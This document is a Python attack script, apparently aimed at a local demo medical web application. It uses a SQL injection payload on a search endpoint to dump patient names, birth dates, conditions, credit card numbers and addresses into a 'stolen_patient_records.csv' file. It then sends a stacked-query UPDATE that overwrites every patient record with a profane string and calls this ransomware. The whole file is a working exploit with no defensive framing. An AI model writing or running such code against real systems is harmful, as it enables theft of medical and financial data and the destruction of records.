import os
import requests
import time
import csv
from bs4 import BeautifulSoup

os.system('clear')
print("RANSOMWARE ATTACK...💥")
time.sleep(2)

url = "http://localhost:3000/search"

print("Phase 1: Dumping all patient data...")

# Strong payload to extract data
dump_payload = "' OR '1'='1' --"
response = requests.get(url, params={'q': dump_payload})

if response.status_code != 200:
    print("Failed to connect to server.")
    exit()

# Parse and save stolen data
soup = BeautifulSoup(response.text, 'html.parser')
rows = soup.find_all('tr')[1:]

stolen_data = []
for row in rows:
    cols = row.find_all('td')
    if len(cols) >= 6:
        stolen_data.append({
            'id': cols[0].text.strip(),
            'name': cols[1].text.strip(),
            'dob': cols[2].text.strip(),
            'condition': cols[3].text.strip(),
            'credit_card': cols[4].text.strip(),
            'address': cols[5].text.strip()
        })

# Save to CSV
with open('stolen_patient_records.csv', 'w', newline='', encoding='utf-8') as f:
    writer = csv.DictWriter(f, fieldnames=['id','name','dob','condition','credit_card','address'])
    writer.writeheader()
    writer.writerows(stolen_data)

print(f"Successfully saved {len(stolen_data)} patient records! to 'stolen_patient_records.csv' ✅")

# Phase 2: Destructive Update via SQL Injection - RANSOMWARE!

print("\nPhase 2: Starting Data Corruption...")
time.sleep(2)

# !!!!!!!!!
update_payload = "'; UPDATE patients SET name='SURPRISE_MOTHER_FUCKER', dob='SURPRISE_MOTHER_FUCKER', condition='SURPRISE_MOTHER_FUCKER', credit_card='SURPRISE_MOTHER_FUCKER', address='SURPRISE_MOTHER_FUCKER' WHERE id > 0; --"

response2 = requests.get(url, params={'q': update_payload})

if response2.status_code == 200:
    print("Data Manipulation Successful! ✅ ")
else:
    print("Update failed.")